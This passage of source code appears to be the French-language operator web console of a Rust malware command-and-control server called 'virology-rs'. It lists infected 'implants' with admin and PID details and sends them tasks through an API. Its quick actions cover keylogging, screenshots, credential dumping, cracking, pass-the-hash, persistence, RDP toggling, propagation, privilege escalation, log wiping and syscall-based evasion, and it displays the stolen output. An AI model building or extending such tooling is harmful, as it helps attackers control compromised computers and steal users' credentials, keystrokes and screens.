#clear-btn:hover{color:var(--fg2);border-color:var(--fg2)}

#toast{position:fixed;bottom:16px;right:16px;display:flex;flex-direction:column;gap:6px;z-index:100;pointer-events:none}
.toast{background:var(--surface2);border:1px solid var(--border);border-left:3px solid var(--green);
  padding:10px 14px;border-radius:4px;font-size:12px;animation:fadeIn .2s ease}
.toast.err{border-left-color:var(--red)}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:0s!important;transition-duration:0s!important}}
</style></head><body>
<header>
  <h1 class="logo">virology<span>-rs</span></h1>
  <div class="hdr-status"><div class="pulse" id="conn-dot"></div><span id="conn-text">connecté</span></div>
  <div class="hdr-right">
    <div id="session-count"><b id="online-n">0</b> en ligne &middot; <span id="total-n">0</span></div>
    <span class="kbd-hint"><kbd>Ctrl</kbd>+<kbd>K</kbd> rechercher</span>
  </div>
</header>
<div class="layout">
  <aside class="sidebar">
    <div class="sidebar-top">
      <div class="search-wrap">
        <svg class="search-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
        <input id="search" placeholder="Filtrer..." aria-label="Filtrer les sessions" spellcheck="false">
      </div>
      <div class="filter-row">
        <button class="fbtn active" data-f="all" onclick="setFilter('all')">Tous</button>
        <button class="fbtn" data-f="online" onclick="setFilter('online')">En ligne</button>
        <button class="fbtn" data-f="offline" onclick="setFilter('offline')">Hors ligne</button>
      </div>
    </div>
    <div id="implant-list"></div>
    <div class="sidebar-footer" id="sidebar-footer"></div>
  </aside>
  <main class="main" id="main">
    <div class="main-empty" id="empty-state">
      <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
        <rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>
      </svg>
      <p>Sélectionnez une session</p>
      <p><kbd>Ctrl</kbd>+<kbd>K</kbd> pour rechercher</p>
    </div>
  </main>
</div>
<div id="toast" aria-live="polite"></div>
<script>
const QA={
  Recon:[['whoami /all','shell','whoami /all'],['ipconfig','shell','ipconfig /all'],['net user','shell','net user'],['tasklist','shell','tasklist'],['detect','detect',''],['avscan','avscan','']],
  Capture:[['screenshot','screenshot',''],['keylog start','keylog','start'],['keylog stop','keylog','stop'],['keylog dump','keylog','dump']],
  Creds:[['creds','creds',''],['crack','crack',''],['pth','pth','']],
  Fichiers:[['loot','loot',''],['upload','transfer','upload'],['download','transfer','download']],
  Persist:[['persist','persist','']],
  "Réseau":[['rdp on','rdp','on'],['rdp off','rdp','off'],['propagate','propagate','']],
  "Système":[['privesc','privesc',''],['logroll','logroll','']],
  "Évasion":[['syscall','syscall','']]
};
const CATS=Object.keys(QA);
let selected=null,sessions={},filter='all',cmdHist=[],cmdIdx=-1,lastKnown=new Set(),apiOk=true,termCleared=false;

async function fetchSessions(){
  try{
    const data=await(await fetch('/admin/api/sessions')).json();
    setConn(true);
    let on=0;const nset=new Set();
    data.forEach(s=>{
      nset.add(s.id);
      if(!lastKnown.has(s.id)&&lastKnown.size>0)toast('Nouvel implant : '+s.hostname+'/'+s.username);
      sessions[s.id]=s;if(s.online)on++;
    });
    lastKnown=nset;
    document.getElementById('online-n').textContent=on;
    document.getElementById('total-n').textContent=data.length;
    renderSidebar(data);
  }catch(e){setConn(false);}
}
function setConn(ok){
  apiOk=ok;
  document.getElementById('conn-dot').className='pulse'+(ok?'':' off');
  document.getElementById('conn-text').textContent=ok?'connecté':'déconnecté';
}
function setFilter(f){
  filter=f;
  document.querySelectorAll('.fbtn').forEach(b=>b.classList.toggle('active',b.dataset.f===f));
  renderSidebar(Object.values(sessions));
}
function renderSidebar(data){
  const q=document.getElementById('search').value.toLowerCase();
  let list=data.filter(s=>{
    if(filter==='online'&&!s.online)return false;
    if(filter==='offline'&&s.online)return false;
    if(q)return(s.hostname+' '+s.username+' '+s.id+' '+s.os).toLowerCase().includes(q);
    return true;
  });
  list.sort((a,b)=>{if(a.online!==b.online)return a.online?-1:1;return a.age-b.age;});
  const el=document.getElementById('implant-list');el.innerHTML='';
  list.forEach(s=>{
    const d=document.createElement('div');d.className='implant-row'+(selected===s.id?' active':'');d.dataset.id=s.id;
    const pid=s.pid?'<span class="badge pid">PID '+s.pid+'</span>':'';
    if(s.online)d.className+=' online-row';
    d.innerHTML='<div class="implant-top"><div class="dot '+(s.online?'on':'off')+'"></div><div class="implant-name">'+esc(s.hostname)+'</div>'+(s.elevated?'<span class="badge admin">ADMIN</span>':'')+pid+'</div><div class="implant-meta"><span>'+esc(s.username)+'</span><span>'+esc(s.os.split(' ')[0])+'</span><span>'+esc(s.arch||'x64')+'</span><span class="badge">'+fmtAge(s.age)+'</span></div>';
    d.onclick=function(){selectSession(s.id);};el.appendChild(d);
  });
  document.getElementById('sidebar-footer').textContent=list.length+'/'+data.length+' affichés';
}
function selectSession(id){
  selected=id;cmdHist=[];cmdIdx=-1;termCleared=false;
  document.querySelectorAll('.implant-row').forEach(r=>r.classList.toggle('active',r.dataset.id===id));
  const s=sessions[id];if(!s)return;
  const pid=s.pid?' · PID '+s.pid:'';
  const seen=new Date(s.first_seen*1000).toLocaleString('fr-FR',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'});
  const tabs=CATS.map(function(k,i){return '<button class="qa-tab'+(i===0?' active':'')+'" data-cat="'+k+'" onclick="setQa(\''+k+'\')">'+k+'</button>';}).join('');
  document.getElementById('main').innerHTML='<div class="terminal-wrap"><div class="term-header"><div class="term-info"><div class="term-title"><div class="dot '+(s.online?'on':'off')+'"></div>'+esc(s.hostname)+' / '+esc(s.username)+'</div><div class="term-sub">'+esc(s.os)+' · '+esc(s.arch||'x64')+pid+' · '+s.id.slice(0,12)+' · vu '+seen+'</div></div></div><div class="qa-panel"><div class="qa-tabs">'+tabs+'</div><div class="qa-actions" id="qa-actions">'+renderQa(CATS[0])+'</div></div><div id="terminal"></div><div class="cmd-bar"><input id="cmd-input" placeholder="commande [args]" aria-label="Commande" autocomplete="off" spellcheck="false"><div class="cmd-btns"><button id="send-btn" onclick="sendCmd()">Envoyer</button><button id="clear-btn" onclick="clearTerm()">Vider</button></div></div></div>';
  document.getElementById('cmd-input').onkeydown=handleKey;
  document.getElementById('cmd-input').focus();
  pollHistory();
}
function renderQa(cat){
  return(QA[cat]||[]).map(function(a){return '<button class="qa-btn" onclick="qt(\''+a[1]+'\',\''+a[2]+'\')">'+a[0]+'</button>';}).join('');
}
function setQa(cat){
  document.querySelectorAll('.qa-tab').forEach(t=>t.classList.toggle('active',t.dataset.cat===cat));
  document.getElementById('qa-actions').innerHTML=renderQa(cat);
}
function handleKey(e){
  if(e.key==='Enter'){sendCmd();return;}
  if(e.key==='ArrowUp'){e.preventDefault();if(cmdHist.length&&cmdIdx<cmdHist.length-1){cmdIdx++;e.target.value=cmdHist[cmdIdx];}return;}
  if(e.key==='ArrowDown'){e.preventDefault();if(cmdIdx>0){cmdIdx--;e.target.value=cmdHist[cmdIdx];}else{cmdIdx=-1;e.target.value='';}return;}
}
function qt(cmd,args){sendTask(cmd,args);}
function sendCmd(){
  const i=document.getElementById('cmd-input');if(!i||!selected)return;
  const v=i.value.trim();if(!v)return;
  cmdHist.unshift(v);cmdIdx=-1;if(cmdHist.length>50)cmdHist.pop();
  const sp=v.indexOf(' ');sendTask(sp<0?v:v.slice(0,sp),sp<0?'':v.slice(sp+1));i.value='';
}
async function sendTask(cmd,args){
  if(!selected)return;termCleared=false;
  try{
    const r=await fetch('/admin/api/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:selected,command:cmd,args:args})});
    if(!r.ok)toast('Erreur : '+r.statusText,true);
  }catch(e){toast('Erreur réseau',true);}
  setTimeout(pollHistory,500);
}
async function pollHistory(){
  if(!selected||termCleared)return;
  try{renderTerminal(await(await fetch('/admin/api/history/'+selected)).json());}catch(e){}
}
function renderTerminal(entries){
  const term=document.getElementById('terminal');if(!term)return;
  term.innerHTML='';
  var arr=[].concat(entries).reverse();
  for(var i=0;i<arr.length;i++){
    var e=arr[i];
    var d=document.createElement('div');d.className='entry';
    var astr=e.args?' <span class="entry-args">'+esc(e.args.length>120?e.args.slice(0,120)+'…':e.args)+'</span>':'';
    var time=e.created?fmtTime(e.created):'';
    var stCls=e.state==='done'?'done':e.state==='running'?'running':'pending';
    var out='';
    if(e.state==='done'&&e.result!==null){
      var RAW_RE=/^__FILE__screenshot\.raw__(?::(\d+):(\d+))?\n/;
      var rawM=e.result.match(RAW_RE);
      if(rawM){
        out='<div class="entry-out" style="padding:4px;background:transparent;border:none"><canvas id="sc_'+e.task_id+'" style="max-width:100%;border-radius:3px"></canvas></div>';
        var rw=rawM[1]?parseInt(rawM[1]):null;
        var rh=rawM[2]?parseInt(rawM[2]):null;
        (function(cid,data,w,h){setTimeout(function(){drawScreenshot(cid,data,w,h);},0)})('sc_'+e.task_id,e.result.slice(rawM[0].length),rw,rh);
      }else{
        out='<div class="entry-out">'+esc(e.result)+'</div>';
      }
    }else if(e.state==='pending'||e.state==='running'){
      out='<div class="entry-pending">'+(e.state==='running'?'Exécution…':'En attente…')+'</div>';
    }
    d.innerHTML='<div class="entry-head"><span class="entry-cmd">'+esc(e.command)+'</span>'+astr+' <span class="entry-state '+stCls+'">'+e.state+'</span><span class="entry-time">'+time+'</span></div>'+out;
    term.appendChild(d);
  }
  term.scrollTop=term.scrollHeight;
}
function clearTerm(){var t=document.getElementById('terminal');if(t)t.innerHTML='';termCleared=true;}
function drawScreenshot(canvasId,b64,w,h){
  try{
    var raw=atob(b64.trim());var len=raw.length;
    var bytes=new Uint8ClampedArray(len);
    for(var i=0;i<len;i++)bytes[i]=raw.charCodeAt(i);
    for(var i=0;i<len;i+=4){var r=bytes[i+2],b=bytes[i];bytes[i]=r;bytes[i+2]=b;bytes[i+3]=255;}
    if(!w||!h){
      var px=len/4;var found=false;
      for(var ri=0;ri<3;ri++){var rat=[16/10,16/9,4/3][ri];var tw=Math.round(Math.sqrt(px*rat));for(var d=-4;d<=4;d++){var cw=tw+d;if(cw>0&&px%cw===0){w=cw;h=px/cw;found=true;break;}}if(found)break;}
      if(!found){var sq=Math.floor(Math.sqrt(px));for(var cw=sq;cw>=sq-200;cw--){if(px%cw===0){w=cw;h=px/cw;break;}}}
    }
    if(w*h*4!==len)return;
    var canvas=document.getElementById(canvasId);if(!canvas)return;
    canvas.width=w;canvas.height=h;
    var dw=Math.min(w,800),dh=Math.round(h*(dw/w));
    canvas.style.width=dw+'px';canvas.style.height=dh+'px';
    canvas.getContext('2d').putImageData(new ImageData(bytes,w,h),0,0);
  }catch(err){}
}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function fmtAge(s){if(s<60)return s+'s';if(s<3600)return Math.floor(s/60)+'m';if(s<86400)return Math.floor(s/3600)+'h';return Math.floor(s/86400)+'j';}
function fmtTime(ts){return new Date(ts*1000).toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});}
function toast(msg,err){var t=document.getElementById('toast');var d=document.createElement('div');d.className='toast'+(err?' err':'');d.textContent=msg;t.appendChild(d);setTimeout(function(){d.remove();},4000);}
document.addEventListener('keydown',function(e){
  if((e.ctrlKey||e.metaKey)&&e.key==='k'){e.preventDefault();document.getElementById('search').focus();}
  if(e.key==='Escape'&&document.activeElement.id!=='cmd-input'){
    selected=null;
    document.getElementById('main').innerHTML='<div class="main-empty"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg><p>Sélectionnez une session</p></div>';
    renderSidebar(Object.values(sessions));
  }
});
document.getElementById('search').addEventListener('input',function(){renderSidebar(Object.values(sessions));});
fetchSessions();
setInterval(fetchSessions,3000);
setInterval(function(){if(selected)pollHistory();},3000);
</script>
</body></html>"###;
